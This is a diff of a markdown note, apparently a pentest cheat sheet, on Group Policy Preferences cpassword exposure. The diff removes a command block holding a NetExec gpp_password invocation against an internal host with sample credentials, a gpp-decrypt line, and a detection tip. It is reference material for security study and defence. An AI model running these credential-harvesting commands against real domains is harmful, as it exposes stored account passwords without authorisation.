@@ -21,14 +21,3 @@ The `cpassword` is encrypted with a **publicly known AES key** → decrypt to cl
 
 ### Commands
 ```bash
-# ── NetExec GPP password module ─────────────────────────────────────
-nxc smb 10.10.10.5 -u lowpriv -p 'Password123!' -M gpp_password
-
-# ── Manual decryption ───────────────────────────────────────────────
-gpp-decrypt <cpassword>
-```
-
-### Detection
-**5145** SYSVOL read of `Groups.xml`; remove `cpassword` from SYSVOL; prefer LAPS/gMSA.
-
----
